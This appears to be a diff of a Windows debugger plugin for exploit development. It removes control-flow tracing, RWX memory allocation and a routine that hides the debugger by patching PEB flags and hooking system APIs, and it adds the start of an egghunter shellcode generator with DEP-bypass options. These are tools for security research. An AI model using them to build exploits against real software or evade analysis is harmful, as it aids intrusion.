-                if os.path.exists(thisstatefilebefore) and os.path.exists(thisstatefileafter):
-                    # read contents from both states into dict
-                    dbg.log("[+] Reading 'before' state from %s" % thisstatefilebefore)
-                    beforestate = readPickleDict(thisstatefilebefore)
-                    dbg.log("[+] Reading 'after' state from %s" % thisstatefileafter)
-                    afterstate = readPickleDict(thisstatefileafter)
-                    # compare
-                    dbg.log("[+] Diffing heap states...")
-
-                else:
-                    if not os.path.exists(thisstatefilebefore):
-                        dbg.log("[-] Oops, unable to find 'before' state file %s" % thisstatefilebefore)
-                    if not os.path.exists(thisstatefileafter):
-                        dbg.log("[-] Oops, unable to find 'after' state file %s" % thisstatefileafter)
-                return
-
-            elif "before" in args:
-                thisstatefilebefore = statefilebefore.reset(showheader=False)
-                dbg.log("[+] Enumerating current heap layout, please wait...")
-                currentstate = getCurrentHeapState()
-                dbg.log("[+] Saving current heap layout to 'before' heap state file %s" % thisstatefilebefore)
-                # save dict to file
-                try:
-                    writePickleDict(thisstatefilebefore, currentstate)
-                    dbg.log("[+] Done")
-                except:
-                    dbg.log("[-] Error while saving current state to file")
-                return
-
-            elif "after" in args:
-                thisstatefileafter = statefileafter.reset(showheader=False)
-                dbg.log("[+] Enumerating current heap layout, please wait...")
-                currentstate = getCurrentHeapState()
-                dbg.log("[+] Saving current heap layout to 'after' heap state file %s" % thisstatefileafter)
-                try:
-                    writePickleDict(thisstatefileafter, currentstate)
-                    dbg.log("[+] Done")
-                except:
-                    dbg.log("[-] Error while saving current state to file")             
-                return          
-
-            return
-
-
-        def procFlow(args):
-
-            srplist = []
-            endlist = []
-            cregs = []
-            cregsc = []
-            avoidlist = []
-            endloc = 0
-            rellist = {}
-            funcnamecache = {}
-            branchstarts = {}
-            maxinstr = 60
-            maxcalllevel = 3
-            callskip = 0
-            instrcnt = 0
-            regs = dbg.getRegs()
-            aregs = getAllRegs()
-            addy = regs["EIP"]
-            addyerror = False
-            eaddy = 0
-            showfuncposition = False
-
-            if "cl" in args:
-                if type(args["cl"]).__name__.lower() != "bool":
-                    try:
-                        maxcalllevel = int(args["cl"])
-                    except:
-                        pass
-
-            if "cs" in args:
-                if type(args["cs"]).__name__.lower() != "bool":
-                    try:
-                        callskip = int(args["cs"])
-                    except:
-                        pass
-            if "avoid" in args:
-                if type(args["avoid"]).__name__.lower() != "bool":
-                    try:
-                        avoidl = args["avoid"].replace("'","").replace('"',"").replace(" ","").split(",")
-                        for aa in avoidl:
-                            a,aok = getAddyArg(aa)
-                            if aok:
-                                if not a in avoidlist:
-                                    avoidlist.append(a)
-                    except:
-                        pass        
-
-            if "cr" in args:
-                if type(args["cr"]).__name__.lower() != "bool":
-                    crdata = args["cr"]
-                    crdata = crdata.replace("'","").replace('"',"").replace(" ","")
-                    crlist = crdata.split(",")
-                    for c in crlist:
-                        c1 = c.upper()
-                        if c1 in aregs:
-                            cregs.append(c1)
-                            csmall = getSmallerRegs(c1)
-                            for cs in csmall:
-                                cregs.append(cs)
-
-            if "crc" in args:
-                if type(args["crc"]).__name__.lower() != "bool":
-                    crdata = args["crc"]
-                    crdata = crdata.replace("'","").replace('"',"").replace(" ","")
-                    crlist = crdata.split(",")
-                    for c in crlist:
-                        c1 = c.upper()
-                        if c1 in aregs:
-                            cregsc.append(c1)
-                            csmall = getSmallerRegs(c1)
-                            for cs in csmall:
-                                cregsc.append(cs)
-
-            cregs = list(set(cregs))
-            cregsc = list(set(cregsc))
-
-            if "n" in args:
-                if type(args["n"]).__name__.lower() != "bool":
-                    try:
-                        maxinstr = int(args["n"])
-                    except:
-                        pass    
-
-            if "func" in args:
-                showfuncposition = True
-
-            if "a" in args:
-                if type(args["a"]).__name__.lower() != "bool":
-                    addy,addyok = getAddyArg(args["a"])
-                    if not addyok:      
-                        dbg.log(" ** Please provide a valid start location with argument -a **")
-                        return
-
-            if "e" in args:
-                if type(args["e"]).__name__.lower() != "bool":
-                    eaddy,eaddyok = getAddyArg(args["e"])
-                    if not eaddyok:
-                        dbg.log(" ** Please provide a valid end location with argument -e **")
-                        return                                      
-
-
-            dbg.log("[+] Max nr of instructions per branch: %d" % maxinstr)
-            dbg.log("[+] Maximum CALL level: %d" % maxcalllevel)
-            if len(avoidlist) > 0:
-                dbg.log("[+] Only showing flows that don't contains these pointer(s):")
-                for a in avoidlist:
-                    dbg.log("    0x%08x" % a)
-            if callskip > 0:
-                dbg.log("[+] Skipping details of the first %d child functions" % callskip)
-            if eaddy > 0:
-                dbg.log("[+] Searching all possible paths between 0x%08x and 0x%08x" % (addy,eaddy))
-            else:
-                dbg.log("[+] Searching all possible paths from 0x%08x" % (addy))
-            if len(cregs) > 0:
-                dbg.log("[+] Controlled registers: %s" % cregs)
-            if len(cregsc) > 0:
-                dbg.log("[+] Controlled register contents: %s" % cregsc)
-
-            # first, get SRPs at this point
-            if addy == regs["EIP"]:
-                cmd2run = "k"
-                srpdata = dbg.nativeCommand(cmd2run)
-                for line in srpdata.split("\n"):
-                    linedata = line.split(" ")
-                    if len(linedata) > 1:
-                        childebp = linedata[0]
-                        srp = linedata[1]
-                        if isAddress(childebp) and isAddress(srp):
-                            srplist.append(hexStrToInt(srp))
-
-            branchstarts[addy] = [0,srplist,0]
-            curlocs = [addy]
-
-            # create relations
-            while len(curlocs) > 0:
-                curloc = curlocs.pop(0)
-                callcnt = 0
-                #dbg.log("New start location: 0x%08x" % curloc)
-                prevloc = curloc
-                instrcnt = branchstarts[curloc][0]
-                srplist = branchstarts[curloc][1]
-                currcalllevel = branchstarts[curloc][2]
-                while instrcnt < maxinstr:
-                    beforeloc = prevloc
-                    prevloc = curloc
-                    try:
-                        thisopcode = dbg.disasm(curloc)
-                        instruction = getDisasmInstruction(thisopcode)              
-                        instructionbytes = thisopcode.getBytes()
-                        instructionsize = thisopcode.opsize
-                        opupper = instruction.upper()
-                        if opupper.startswith("RET"): 
-                            if currcalllevel > 0:
-                                currcalllevel -= 1
-                            if len(srplist) > 0:
-                                newloc = srplist.pop(0)
-                                rellist[curloc] = [newloc]
-                                curloc = newloc
-                            else:
-                                break
-                        elif opupper.startswith("JMP"):
-                            if "(" in opupper and ")" in opupper:
-                                ipartsa = opupper.split(")")
-                                ipartsb = ipartsa[0].split("(")
-                                if len(ipartsb) > 0:
-                                    jmptarget = ipartsb[1]
-                                    if isAddress(jmptarget):
-                                        newloc = hexStrToInt(jmptarget)
-                                        rellist[curloc] = [newloc]
-                                        curloc = newloc
-                        elif opupper.startswith("J"):
-                            if "(" in opupper and ")" in opupper:
-                                ipartsa = opupper.split(")")
-                                ipartsb = ipartsa[0].split("(")
-                                if len(ipartsb) > 0:
-                                    jmptarget = ipartsb[1]
-                                    if isAddress(jmptarget):
-                                        newloc = hexStrToInt(jmptarget)
-                                        if not newloc in curlocs:
-                                            curlocs.append(newloc)
-                                        branchstarts[newloc] = [instrcnt,srplist,currcalllevel]
-                                        newloc2 = prevloc + instructionsize
-                                        rellist[curloc] = [newloc,newloc2]
-                                        curloc = newloc2
-                                        #dbg.log("    Added 0x%08x as alternative branch start" % newloc)
-                        elif opupper.startswith("CALL"):
-                            
-                            if ("(" in opupper and ")" in opupper) and currcalllevel < maxcalllevel and callcnt > callskip:
-                                ipartsa = opupper.split(")")
-                                ipartsb = ipartsa[0].split("(")
-                                if len(ipartsb) > 0:
-                                    jmptarget = ipartsb[1]
-                                    if isAddress(jmptarget):
-                                        newloc = hexStrToInt(jmptarget)
-                                        rellist[curloc] = [newloc]
-                                        curloc = newloc
-                                newretptr = prevloc + instructionsize
-                                srplist.insert(0,newretptr)
-                                currcalllevel += 1
-                            else:
-                                # don't show the function details, simply continue after the call
-                                newloc = curloc+instructionsize
-                                rellist[curloc] = [newloc]
-                                curloc = newloc
-                            callcnt += 1
-                        else:
-                            curloc += instructionsize
-                            rellist[prevloc] = [curloc]
-                    except:
-                        #dbg.log("Unable to disasm at 0x%08x, past: 0x%08x" % (curloc,beforeloc))
-                        if not beforeloc in endlist:
-                            endlist.append(beforeloc)
-                        instrcnt = maxinstr
-                        break
-                    #dbg.log("%d 0x%08x : %s  -> 0x%08x" % (instrcnt,prevloc,instruction,curloc))
-                    instrcnt += 1
-                if not curloc in endlist:
-                    endlist.append(curloc)
-
-            dbg.log("[+] Found total of %d possible flows" % len(endlist))
-
-            if eaddy > 0:
-                if eaddy in rellist:
-                    endlist = [eaddy]
-                    dbg.log("[+] Limit flows to cases that contain 0x%08x" % eaddy)
-                else:
-                    dbg.log(" ** Unable to reach 0x%08x ** " % eaddy)
-                    dbg.log("    Try increasing max nr of instructions with parameter -n")
-                    return
-
-            filename = "flows.txt"
-            logfile = MnLog(filename)
-            thislog = logfile.reset()
-
-            dbg.log("[+] Processing %d endings" % len(endlist))
-            endingcnt = 1
-            processedresults = []
-            for endaddy in endlist:
-                dbg.log("[+] Creating all paths between 0x%08x and 0x%08x" % (addy,endaddy))
-                allpaths = findAllPaths(rellist,addy,endaddy)
-                if len(allpaths) == 0:
-                    #dbg.log("    *** No paths from 0x%08x to 0x%08x *** " % (addy,endaddy))
-                    continue
-
-                dbg.log("[+] Ending: 0x%08x (%d/%d), %d paths" % (endaddy,endingcnt,len(endlist), len(allpaths)))
-                endingcnt += 1
-
-                for p in allpaths:
-                    if p in processedresults:
-                        dbg.log("    > Skipping duplicate path from 0x%08x to 0x%08x" % (addy,endaddy))
-                    else:
-                        processedresults.append(p)
-                        skipthislist = False
-                        logl = "Path from 0x%08x to 0x%08x (%d instructions) :" % (addy,endaddy,len(p))
-                        if len(avoidlist) > 0:
-                            for a in avoidlist:
-                                if a in p:
-                                    dbg.log("    > Skipping path, contains 0x%08x (which should be avoided)"%a)
-                                    skipthislist = True
-                                    break
-                        if not skipthislist:
-                            logfile.write("\n",thislog)
-                            logfile.write(logl,thislog)
-                            logfile.write("-" * len(logl),thislog)
-                            dbg.log("    > Simulating path from 0x%08x to 0x%08x (%d instructions)" % (addy,endaddy,len(p)))
-                            cregsb = []
-                            for c in cregs:
-                                cregsb.append(c)
-                            cregscb = []
-                            for c in cregsc:
-                                cregscb.append(c)
-
-                            prevfname = ""
-                            fname = ""
-                            foffset = ""
-                            previnstruction = ""
-                            for thisaddy in p:
-                                if showfuncposition:
-                                    if previnstruction == "" or previnstruction.startswith("RET") or previnstruction.startswith("J") or previnstruction.startswith("CALL"):
-                                        if not thisaddy in funcnamecache:
-                                            fname,foffset = getFunctionName(thisaddy)
-                                            funcnamecache[thisaddy] = [fname,foffset]
-                                        else:
-                                            fname = funcnamecache[thisaddy][0]
-                                            foffset = funcnamecache[thisaddy][1]
-                                        if fname != prevfname:
-                                            prevfname = fname
-                                            locname = fname
-                                            if foffset != "":
-                                                locname += "+%s" % foffset
-                                            logfile.write("#--- %s ---" % locname,thislog)
-                                        #dbg.log("%s" % locname)
-
-                                thisopcode = dbg.disasm(thisaddy)
-                                instruction = getDisasmInstruction(thisopcode)
-                                previnstruction = instruction
-                                clist = []
-                                clistc = []
-                                for c in cregsb:
-                                    combins = []
-                                    combins.append(" %s" % c)
-                                    combins.append("[%s" % c)
-                                    combins.append(",%s" % c)
-                                    combins.append("%s]" % c)
-                                    combins.append("%s-" % c)
-                                    combins.append("%s+" % c)
-                                    combins.append("-%s" % c)
-                                    combins.append("+%s" % c)
-                                    for comb in combins:
-                                        if comb in instruction and not c in clist:
-                                            clist.append(c)
-
-                                for c in cregscb:
-                                    combins = []
-                                    combins.append(" %s" % c)
-                                    combins.append("[%s" % c)
-                                    combins.append(",%s" % c)
-                                    combins.append("%s]" % c)
-                                    combins.append("%s-" % c)
-                                    combins.append("%s+" % c)
-                                    combins.append("-%s" % c)
-                                    combins.append("+%s" % c)
-                                    for comb in combins:
-                                        if comb in instruction and not c in clistc:
-                                            clistc.append(c)
-                                
-                                rsrc,rdst = getSourceDest(instruction)
-
-                                csource = False
-                                cdest = False
-
-                                if rsrc in cregsb or rsrc in cregscb:
-                                    csource = True
-                                if rdst in cregsb or rdst in cregscb:
-                                    cdest = True
-
-                                destructregs = ["MOV","XOR","OR"]
-                                writeregs = ["INC","DEC","AND"]
-
-
-                                ocregsb = copy.copy(cregsb)
-
-                                if not instruction.startswith("TEST") and not instruction.startswith("CMP"):
-                                    for d in destructregs:
-                                        if instruction.startswith(d):
-                                            sourcefound = False
-                                            sourcereg = ""
-                                            destfound = False
-                                            destreg = ""
-
-                                            for s in clist:
-                                                for sr in rsrc:
-                                                    if s in sr and not sourcefound:
-                                                        sourcefound = True
-                                                        sourcereg = s
-                                                for sr in rdst:
-                                                    if s in sr and not destfound:
-                                                        destfound = True
-                                                        destreg = s
-
-                                            if sourcefound and destfound:
-                                                if not destreg in cregsb:
-                                                    cregsb.append(destreg)
-                                            if destfound and not sourcefound:
-                                                sregs = getSmallerRegs(destreg)
-                                                if destreg in cregsb:
-                                                    cregsb.remove(destreg)
-                                                for s in sregs:
-                                                    if s in cregsb:
-                                                        cregsb.remove(s)
-                                            break
-                                #else:
-                                    #dbg.log("    Control: %s" % ocregsb)
-
-
-                                logfile.write("0x%08x : %s" % (thisaddy,instruction),thislog)
-                                
-                                #if len(cregs) > 0 or len(cregsb) > 0:
-                                #   if cmp(ocregsb,cregsb) == -1:
-                                #       dbg.log("    Before: %s" % ocregsb)
-                                #       dbg.log("    After : %s" % cregsb)
-            return
-
-
-        def procChangeACL(args):
-            size = 1
-            addy = 0
-            acl = ""
-            addyerror = False
-            aclerror = False
-            if "a" in args:
-                if type(args["a"]).__name__.lower() != "bool":
-                    addy,addyok = getAddyArg(args["a"])
-                    if not addyok:
-                        addyerror = True
-            if "acl" in args:
-                if type(args["acl"]).__name__.lower() != "bool":
-                    if args["acl"].upper() in memProtConstants:
-                        acl = args["acl"].upper()
-                    else:
-                        aclerror = True
-            else:
-                aclerror = True 
-            
-            if addyerror:
-                dbg.log(" *** Please specify a valid address to argument -a ***")
-
-            if aclerror:
-                dbg.log(" *** Please specify a valid memory protection constant with -acl ***")
-                dbg.log(" *** Valid values are :")
-                for acltype in memProtConstants:
-                    dbg.log("     %s (%s = 0x%02x)" % (toSize(acltype,10),memProtConstants[acltype][0],memProtConstants[acltype][1]))
-
-            if not addyerror and not aclerror:
-                pageacl = memProtConstants[acl][1]
-                pageaclname = memProtConstants[acl][0]
-                dbg.log("[+] Current ACL: %s" % getPointerAccess(addy))
-                dbg.log("[+] Desired ACL: %s (0x%02x)" % (pageaclname,pageacl))
-                retval = dbg.rVirtualAlloc(addy,1,0x1000,pageacl)
-            return
-
-
-        def procToBp(args):
-            """
-            Generate WinDBG syntax to create a logging breakpoint on a given location
-            """
-            addy = 0
-            addyerror = False
-            executenow = False
-            locsyntax = ""
-            regsyntax = ""
-            poisyntax = ""
-            dmpsyntax = ""
-            instructionparts = []
-            global silent
-            oldsilent = silent
-            regs = dbg.getRegs()
-            silent = True
-            if "a" in args:
-                if type(args["a"]).__name__.lower() != "bool":
-                    addy,addyok = getAddyArg(args["a"])
-                    if not addyok:
-                        addyerror = True
-            else:
-                addy = regs["EIP"]
-
-            if "e" in args:
-                executenow = True
-
-            if addyerror:
-                dbg.log(" *** Please provide a valid address with argument -a ***",highlight=1)
-                return
-
-            # get RVA for addy (or absolute address if addy is not part of a module)
-            bpdest = "0x%08x" % addy
-            instruction = ""
-            ptrx = MnPointer(addy)
-            modname = ptrx.belongsTo()
-            if not modname == "":
-                mod = MnModule(modname)
-                m = mod.moduleBase
-                rva = addy - m
-                bpdest = "%s+0x%02x" % (modname,rva)
-                thisopcode = dbg.disasm(addy)
-                instruction = getDisasmInstruction(thisopcode)
-
-            locsyntax = "bp %s" % bpdest
-
-            instructionparts = multiSplit(instruction,[" ",","])
-
-            usedregs = []
-            
-            for reg in regs:
-                for ipart in instructionparts:
-                    if reg.upper() in ipart.upper():
-                        usedregs.append(reg)
-
-            if len(usedregs) > 0:
-                regsyntax = '.printf \\"'
-                argsyntax = ""
-                
-                for ipart in instructionparts:
-                    for reg in regs:
-                        if reg.upper() in ipart.upper():
-
-                            if "[" in ipart:
-                                regsyntax += ipart.replace("[","").replace("]","")
-                                regsyntax += ": 0x%08x, "
-
-                                argsyntax += "%s," % ipart.replace("[","").replace("]","")
-
-                                regsyntax += ipart
-                                regsyntax += ": 0x%08x, "                               
-
-                                argsyntax += "%s," % ipart.replace("[","poi(").replace("]",")")
-                                
-                                iparttxt = ipart.replace("[","").replace("]","")
-                                dmpsyntax += ".echo;.echo %s:;dds %s L 0x24/4;" % (iparttxt,iparttxt)
-                            else:
-                                regsyntax += ipart
-                                regsyntax += ": 0x%08x, "                               
-                                argsyntax += "%s," % ipart 
-                argsyntax = argsyntax.strip(",")
-                regsyntax = regsyntax.strip(", ")
-                regsyntax += '\\",%s;' % argsyntax
-
-            if "CALL" in instruction.upper():
-                dmpsyntax += '.echo;.printf \\"Stack (esp: 0x%08x):\\",esp;.echo;dds esp L 0x4;'
-
-            if instruction.upper().startswith("RET"):
-                dmpsyntax += '.echo;.printf \\"EAX: 0x%08x, Ret To: 0x%08x, Arg1: 0x%08x, Arg2: 0x%08x, Arg3: 0x%08x, Arg4: 0x%08x\\",eax,poi(esp),poi(esp+4),poi(esp+8),poi(esp+c),poi(esp+10);'
-
-            bpsyntax = locsyntax + ' ".echo ---------------;u eip L 1;' + regsyntax + dmpsyntax + ".echo;g" + '"'
-            filename = "logbps.txt"
-            logfile = MnLog(filename)
-            thislog = logfile.reset(False,False)
-            with open(thislog, "a") as fh:
-                fh.write(bpsyntax + "\n")
-            silent = oldsilent
-            dbg.log("%s" % bpsyntax)
-            dbg.log("Updated %s" % thislog)
-            if executenow:
-                dbg.nativeCommand(bpsyntax)
-                dbg.log("> Breakpoint set at 0x%08x" % addy)
-            return
-
-
-        def procAllocMem(args):
-            size = 0x1000
-            addy = 0
-            sizeerror = False
-            addyerror = False
-            byteerror = False
-            fillup = False
-            writemore = False
-            fillbyte = "A"
-            acl = "RWX"
-
-            if "s" in args:
-                if type(args["s"]).__name__.lower() != "bool":
-                    sval = args["s"]
-                    if sval.lower().startswith("0x"):
-                        try:
-                            size = int(sval,16)
-                        except:
-                            sizeerror = True
-                    else:
-                        try:
-                            size = int(sval)
-                        except:
-                            sizeerror = True
-                else:
-                    sizeerror = True
-
-            if "b" in args:
-                if type(args["b"]).__name__.lower() != "bool":
-                    try:
-                        fillbyte = hex2bin(args["b"])[0]
-                    except:
-                        dbg.log(" *** Invalid byte specified with -b ***")
-                        byteerror = True
-
-            if size < 0x1:
-                sizeerror = True
-                dbg.log(" *** Minimum size is 0x1 bytes ***",highlight=1)
-
-            if "a" in args:
-                if type(args["a"]).__name__.lower() != "bool":
-                    addy,addyok = getAddyArg(args["a"])
-                    if not addyok:
-                        addyerror = True
-
-            if "fill" in args:
-                fillup = True
-                if "force" in args:
-                    writemore = True
-
-            aclerror = False
-            if "acl" in args:
-                if type(args["acl"]).__name__.lower() != "bool":
-                    if args["acl"].upper() in memProtConstants:
-                        acl = args["acl"].upper()
-                    else:
-                        aclerror = True
-                        dbg.log(" *** Please specify a valid memory protection constant with -acl ***")
-                        dbg.log(" *** Valid values are :")
-                        for acltype in memProtConstants:
-                            dbg.log("     %s (%s = 0x%02x)" % (toSize(acltype,10),memProtConstants[acltype][0],memProtConstants[acltype][1]))
-
-            if addyerror:
-                dbg.log(" *** Please specify a valid address with -a ***",highlight=1)
-
-            if sizeerror:
-                dbg.log(" *** Please specify a valid size with -s ***",highlight = 1)
-            
-            if not addyerror and not sizeerror and not byteerror and not aclerror:
-                dbg.log("[+] Requested allocation size: 0x%08x (%d) bytes" % (size,size))
-                if addy > 0:
-                    dbg.log("[+] Desired target location : 0x%08x" % addy)
-                pageacl = memProtConstants[acl][1]
-                pageaclname = memProtConstants[acl][0]
-                if addy > 0:
-                    dbg.log("    Current page ACL: %s" % getPointerAccess(addy))
-                dbg.log("    Desired page ACL: %s (0x%02x)" % (pageaclname,pageacl))
-                VIRTUAL_MEM = ( 0x1000 | 0x2000 )
-                allocat = dbg.rVirtualAlloc(addy,size,0x1000,pageacl)
-                if addy == 0 and allocat > 0:
-                    retval = dbg.rVirtualProtect(allocat,1,pageacl)
-                else:
-                    retval = dbg.rVirtualProtect(addy,1,pageacl)
-                
-                dbg.log("[+] Allocated memory at 0x%08x" % allocat)
-                #if allocat > 0:
-                #   dbg.log("    ACL 0x%08x: %s" % (allocat,getPointerAccess(allocat)))
-                #else:
-                #   dbg.log("    ACL 0x%08x: %s" % (addy,getPointerAccess(addy)))
-
-                if allocat == 0 and fillup and not writemore:
-                    dbg.log("[+] It looks like the page was already mapped. Use the -force argument")
-                    dbg.log("    to make me write to 0x%08x anyway" % addy)
-                if (allocat > 0 and fillup) or (writemore and fillup):
-                    loc = 0
-                    written = 0
-                    towrite = size
-                    while loc < towrite:
-                        try:
-                            dbg.writeMemory(addy+loc,fillbyte)
-                            written += 1
-                        except:
-                            pass
-                        loc += 1
-                    dbg.log("[+] Wrote %d times \\x%s to chunk at 0x%08x" % (written,bin2hex(fillbyte),addy))
-            return
-
-
-        def procHideDebug(args):
-            peb = dbg.getPEBAddress()           
-            dbg.log("[+] Patching PEB (0x%08x)" % peb)
-            if peb == 0:
-                dbg.log("** Unable to find PEB **")
-                return
-
-            isdebugged = struct.unpack('<B',dbg.readMemory(peb + 0x02,1))[0]
-            processheapflag = dbg.readLong(peb + 0x18)
-            processheapflag += 0x10
-            processheapvalue = dbg.readLong(processheapflag)
-            ntglobalflag = dbg.readLong(peb + 0x68)
-
-            dbg.log("    Patching PEB.IsDebugged       : 0x%x -> 0x%x" % (isdebugged,0))
-            dbg.writeMemory(peb + 0x02, '\x00')
-            
-            dbg.log("    Patching PEB.ProcessHeap.Flag : 0x%x -> 0x%x" % (processheapvalue,0))
-            dbg.writeLong(processheapflag,0)
-            
-            dbg.log("    Patching PEB.NtGlobalFlag     : 0x%x -> 0x%x" % (ntglobalflag,0))
-            dbg.writeLong(peb + 0x68, 0)
-            
-            dbg.log("    Patching PEB.LDR_DATA Fill pattern")
-            a = dbg.readLong(peb + 0xc)
-            while a != 0:
-                a += 1
-                try:
-                    b = dbg.readLong(a)
-                    c = dbg.readLong(a + 4)
-                    if (b == 0xFEEEFEEE) and (c == 0xFEEEFEEE):
-                        dbg.writeLong(a,0)
-                        dbg.writeLong(a + 4,0)
-                        a += 7
-                except:
-                    break
-
-            uef = dbg.getAddress("kernel32.UnhandledExceptionFilter")
-            if uef > 0:
-                dbg.log("[+] Patching kernel32.UnhandledExceptionFilter (0x%08x)" % uef)
-                uef += 0x86
-                dbg.writeMemory(uef, dbg.assemble(" \
-                    PUSH EDI \
-                "))
-            else:
-                dbg.log("[-] Failed to hook kernel32.UnhandledExceptionFilter (0x%08x)")
-
-            remdebpres = dbg.getAddress("kernel32.CheckRemoteDebuggerPresent")
-            if remdebpres > 0:
-                dbg.log("[+] Patching CheckRemoteDebuggerPresent (0x%08x)" % remdebpres)
-                dbg.writeMemory( remdebpres, dbg.assemble( " \
-                    MOV   EDI, EDI                                    \n \
-                    PUSH EBP                                         \n \
-                    MOV  EBP, ESP                                    \n \
-                    MOV   EAX, [EBP + C]                              \n \
-                    PUSH  0                                           \n \
-                    POP   [EAX]                                       \n \
-                    XOR   EAX, EAX                                    \n \
-                    POP   EBP                                         \n \
-                    RET   8                                           \
-                " ) )
-            else:
-                dbg.log("[-] Unable to patch CheckRemoteDebuggerPresent")
-
-            gtc = dbg.getAddress("kernel32.GetTickCount")
-            if gtc > 0:
-                dbg.log("[+] Patching GetTickCount (0x%08x)" % gtc)
-                patch = dbg.assemble("MOV EDX, 0x7FFE0000") + Poly_ReturnDW(0x0BADF00D) + dbg.assemble("Ret")
-                while len(patch) > 0x0F:
-                    patch = dbg.assemble("MOV EDX, 0x7FFE0000") + Poly_ReturnDW(0x0BADF00D) + dbg.assemble("Ret")
-                dbg.writeMemory( gtc, patch )
-            else:
-                dbg.log("[-] Unable to pach GetTickCount")
-
-            zwq = dbg.getAddress("ntdll.ZwQuerySystemInformation")
-            if zwq > 0:
-                dbg.log("[+] Patching ZwQuerySystemInformation (0x%08x)" % zwq)
-                isPatched = False
-                a = 0
-                s = 0
-                while a < 3:
-                    a += 1
-                    s += dbg.disasmSizeOnly(zwq + s).opsize
-                FakeCode = dbg.readMemory(zwq, 1) + "\x78\x56\x34\x12" + dbg.readMemory(zwq + 5, 1)
-                if FakeCode == dbg.assemble("PUSH 0x12345678\nRET"):
-                    isPatched = True
-                    a = dbg.readLong(zwq+1)
-                    i = 0
-                    s = 0
-                    while i < 3:
-                        i += 1
-                        s += dbg.disasmSizeOnly(a+s).opsize
-
-                if isPatched:
-                    dbg.log("    Function was already patched.")
-                else:
-                    a = dbg.remoteVirtualAlloc(size=0x1000)
-                    if a > 0:
-                        dbg.log("    Writing instructions to 0x%08x" % a)
-                        dbg.writeMemory(a, dbg.readMemory(zwq,s))
-                        pushCode = dbg.assemble("PUSH 0x%08x" % (zwq + s))
-                        patchCode = "\x83\x7c\x24\x08\x07"  # CMP [ESP+8],7
-                        patchCode += "\x74\x06" 
-                        patchCode += pushCode
-                        patchCode += "\xC3"                 # RETN
-                        patchCode += "\x8B\x44\x24\x0c"     # MOV EAX,[ESP+0x0c]
-                        patchCode += "\x6a\x00"             # PUSH 0
-                        patchCode += "\x8f\x00"             # POP [EAX]
-                        patchCode += "\x33\xC0"             # XOR EAX,EAX
-                        patchCode += "\xC2\x14\x00"         # RETN 14
-                        dbg.writeMemory( a + s, patchCode)
-                        # redirect function
-                        dbg.writeMemory( zwq, dbg.assemble( "PUSH 0x%08X\nRET" % a) )
-
-                    else:
-                        dbg.log("    ** Unable to allocate memory in target process **")
-
-            else:
-                dbg.log("[-] Unable to patch ZwQuerySystemInformation")
-
-            return          
-
-
-        # ----- Finally, some main stuff ----- #
-        
-        # All available commands and their Usage :
-        
-        sehUsage = """Default module criteria : non safeseh, non aslr, non rebase
+			global ignoremodules
+			ignoremodules = True
+			getpcfilename="getpc.txt"
+			objgetpcfile = MnLog(getpcfilename)
+			getpcfile = objgetpcfile.reset()
+			objgetpcfile.write(output,getpcfile)
+			ignoremodules = False
+			dbg.logLines(output)
+			dbg.log("")			
+			dbg.log("Wrote to file %s" % getpcfile)
+			return		
+
+			
+		#----- Egghunter -----#
+		def procEgg(args):
+			filename = ""
+			egg = "w00t"
+			usechecksum = False
+			usewow64 = False
+			useboth = False
+			egg_size = 0
+			win_ver = "10"
+			win_vers = ["7","10"]
+			checksumbyte = ""
+			extratext = ""
+			
+			global silent
+			oldsilent = silent
+			silent = True			
+			
+			if "f" in args:
+				if type(args["f"]).__name__.lower() != "bool":
+					filename = args["f"]
+			filename = getAbsolutePath(filename.replace("'", "").replace("\"", ""))
+
+			if "winver" in args:
+				if str(args["winver"]) in win_vers:
+					win_ver = str(args["winver"])
+				else:
+					dbg.log("[-] Didn't recognize windows version, using Win10 as the default", highlight=True)
+			#Set egg
+			if "t" in args:
+				if type(args["t"]).__name__.lower() != "bool":
+					egg = args["t"]
+
+			if "wow64" in args:
+				usewow64 = True
+
+
+			# placeholder for later
+			if "both" in args:
+				useboth = True
+
+			if len(egg) != 4:
+				egg = 'w00t'
+			dbg.log("[+] Egg set to %s" % egg)
+			
+			if "c" in args:
+				if filename != "":
+					usechecksum = True
+					dbg.log("[+] Hunter will include checksum routine")
+				else:
+					dbg.log("Option -c only works in conjunction with -f <filename>",highlight=1)
+					return
+			
+			startreg = ""
+			if "startreg" in args:
+				if isReg(args["startreg"]):
+					startreg = args["startreg"].lower()
+					dbg.log("[+] Egg will start search at %s" % startreg)
+			
+					
+			depmethods = ["virtualprotect","copy","copy_size"]
+			depreg = "esi"
+			depsize = 0
+			freeregs = [ "ebx","ecx","ebp","esi" ]
+			
+			regsx = {}
+			# 0 : mov xX
+			# 1 : push xX
+			# 2 : mov xL
+			# 3 : mov xH
+			#
+			regsx["eax"] = ["\x66\xb8","\x66\x50","\xb0","\xb4"]
+			regsx["ebx"] = ["\x66\xbb","\x66\x53","\xb3","\xb7"]
+			regsx["ecx"] = ["\x66\xb9","\x66\x51","\xb1","\xb5"]
+			regsx["edx"] = ["\x66\xba","\x66\x52","\xb2","\xb6"]
+			regsx["esi"] = ["\x66\xbe","\x66\x56"]
+			regsx["edi"] = ["\x66\xbf","\x66\x57"]
+			regsx["ebp"] = ["\x66\xbd","\x66\x55"]
+			regsx["esp"] = ["\x66\xbc","\x66\x54"]
+			
+			addreg = {}
+			addreg["eax"] = "\x83\xc0"
+			addreg["ebx"] = "\x83\xc3"			
+			addreg["ecx"] = "\x83\xc1"
+			addreg["edx"] = "\x83\xc2"
+			addreg["esi"] = "\x83\xc6"
+			addreg["edi"] = "\x83\xc7"
+			addreg["ebp"] = "\x83\xc5"			
+			addreg["esp"] = "\x83\xc4"
+			
+			depdest = ""
+			depmethod = ""
+			
+			getpointer = ""
+			getsize = ""
+			getpc = ""
+			
+			jmppayload = "\xff\xe7"	#jmp edi
+			
+			if "depmethod" in args:
+				if args["depmethod"].lower() in depmethods:
+					depmethod = args["depmethod"].lower()
+					dbg.log("[+] Hunter will include routine to bypass DEP on found shellcode")
+					# other DEP related arguments ?
+					# depreg
+					# depdest
+					# depsize
+				if "depreg" in args:
+					if isReg(args["depreg"]):
+						depreg = args["depreg"].lower()
+				if "depdest" in args:
+					if isReg(args["depdest"]):
+						depdest = args["depdest"].lower()
+				if "depsize" in args:
+					try:
+						depsize = int(args["depsize"])
+					except:
+						dbg.log(" ** Invalid depsize",highlight=1)
+						return
+			
+			
+			#read payload file
+			data = ""
+			if filename != "":
+				try:
+					f = open(filename, "rb")
+					data = f.read()
+					f.close()
+					dbg.log("[+] Read payload file (%d bytes)" % len(data))
+				except:
+					dbg.log("Unable to read file %s" %filename, highlight=1)
+					return
+
+					
